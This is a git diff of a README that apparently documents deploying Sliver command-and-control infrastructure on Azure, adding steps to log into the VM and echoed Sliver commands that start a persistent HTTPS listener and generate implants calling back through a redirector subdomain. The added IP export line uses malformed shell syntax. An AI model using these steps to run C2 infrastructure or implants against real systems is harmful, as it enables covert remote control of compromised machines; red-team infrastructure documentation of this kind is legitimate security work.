@@ -15,7 +15,12 @@ Then get the public IP of the VM and login:
 az vm show --resource-group <YourResourceGroupName> --name <YourVMName> --query 'networkProfile.networkInterfaces[].id' -o tsv
 az network nic show --ids <NetworkInterfaceId> --query 'ipConfigurations[].publicIpAddress.id' -o tsv
 
-ssh azureadmin@x.x.x.x
+export VMIP=${terraform output public_ip}
+ssh azureadmin@$VMIP
+
+echo "sliver"
+echo "https --cert /etc/letsencrypt/live/$C2_SUBDOMAIN/cert.pem --key /etc/letsencrypt/live/$C2_SUBDOMAIN/privkey.pem --domain $C2_SUBDOMAIN --lhost 0.0.0.0 --lport 443 --persistent"
+echo "generate --http $REDIRECTOR_SUBDOMAIN/content --http $REDIRECTOR_SUBDOMAIN/assets"
 ```
 To configure the nginx CDN path you will need to get the storage account path:
 - *I highly reccomend using [Azure SE](https://azure.microsoft.com/en-us/products/storage/storage-explorer) to manage files on the storage account.*
